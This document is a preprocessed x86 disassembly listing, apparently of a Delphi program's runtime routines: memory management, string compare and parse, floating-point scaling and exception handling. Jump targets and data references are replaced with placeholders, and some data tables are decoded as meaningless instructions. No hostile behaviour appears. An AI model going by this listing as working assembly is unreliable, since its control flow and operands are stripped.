mov edx [ eax + 0x8 ]
add ebx edx
call sub_401ba0
sub_40241c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401e90
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401ba0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401f94
test al al
je r-xdata
call sub_401ba0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c64
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e08
jmp r-xdata
sub_4025f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026a9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4019fc
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40241c
test al al
je r-xdata
push rw-data
call sub_401358
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4020e8
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028b8
mov eax ebx
call sub_402278
retn
push rw-data
call sub_401360
sub_4026bc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402818
sub_4026dc
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402818
sub_4026fc
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402818
mov [ ecx ] eax
mov al 0x2
jmp sub_402818
retn
mov [ ecx ] eax
retn
sub_40278c
push ebx
push esi
call sub_405c24
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405c24
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405c24
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027cc
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405c24
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027c0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402854
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028b8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_40291c
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_40295c
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402844
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_4029b0
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402844
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402844
jmp r-xdata
sub_402a08
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028b8
pop ebx
retn
mov ecx ebx
sub_402a24
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402aa8
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402b18
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402b38
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402c18
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402c58
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d0b ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d0b ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402d0b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_402dd0
mov bh [ esi ]
inc eax
add [ eax ] al
bound ebp [ ebp + eax * 8 + 0x41ad78eb ]
inc eax
add [ eax + 0x26b7177a ] al
xlat
fadd [ eax + eax * 2 ]
nop
lodsb [ esi ]
outsb
xor bh [ eax - 0x7a ]
xchg [ eax + 0x40 ] ecx
add [ edi + edx * 2 + 0x68163f0a ] dh
test eax 0xa100404b
in eax dx
int3
sub_402f44
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_402f74
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012b4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_402fe5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012ac
retn
sub_403068
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403110
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_403168
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404890
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_403188
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_40550c
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_4031b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_40323c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_40324c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403243
lea eax [ ebp - 0x8 ]
call sub_4054f4
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_403188
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40550c
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_40324c
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_403290
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403330
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4032d0
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403300
push eax
push ecx
mov eax [ eax ]
call sub_4032d0
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403e48
call [ rw-data ]
sub_403318
push esi
mov esi edx
mov eax [ eax ]
call sub_4032d0
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403e48
call [ rw-data ]
sub_403360
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_4032d0
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_403388
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_4033d8
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_403428
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403451
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_4034bc
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_4034f8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_40350c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403520
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403540
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403520
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_4035a4
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403038
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405c24
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_40350c
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_4034bc
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_4036d0
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403038
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_4034bc
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405c24
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_4034f8
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402aa8
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403858
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403540
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403890
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403e48
sub_4038b8
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405c24
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403104
call sub_4034a0
sub_40390c
call sub_405c24
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403104
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_403568
jmp edx
sub_403954
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027c0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
